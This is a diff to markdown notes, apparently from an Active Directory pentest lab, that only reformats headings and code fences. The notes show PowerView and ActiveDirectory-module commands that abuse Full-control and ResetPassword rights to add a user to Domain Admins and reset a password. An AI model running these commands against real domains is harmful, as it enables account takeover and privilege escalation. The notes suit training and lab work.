@@ -473,7 +473,7 @@ timeoutMinutes 1 -showProgress -Verbose
 **_More Examples - :_**
 
 
-- Check the Domain Admins permission - `PowerView` as normal user:
+- Check the **Domain Admins permission** - `PowerView` as normal user:
 
 
 ```powershell
@@ -490,7 +490,7 @@ cess | ?{$_.IdentityReference -match 'student1'}
 ```
 
 
-- Abusing Full-control using `PowerView`:
+- Abusing **Full-control** using `PowerView`:
 
 
 ```powershell
@@ -509,22 +509,21 @@ Add-ADGroupMember -Identity 'Domain Admins' -Members testda
 
 
 
-- Abusing ResetPassword using `PowerView`:
+- Abusing **ResetPassword** using `PowerView`:
 
 
 
 ```powershell
-Set-DomainUserPassword -Identity testda -AccountPassword
-(ConvertTo-SecureString "Password@123" -AsPlainText -
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -
 Force) -Verbose
 ```
 
 
-- Using ActiveDirectory Module:
+- Using `ActiveDirectory Module`:
 
 
 
-```
+```powershell
 Set-ADAccountPassword -Identity testda -NewPassword
 (ConvertTo-SecureString "Password@123" -AsPlainText -
 Force) -Verbose
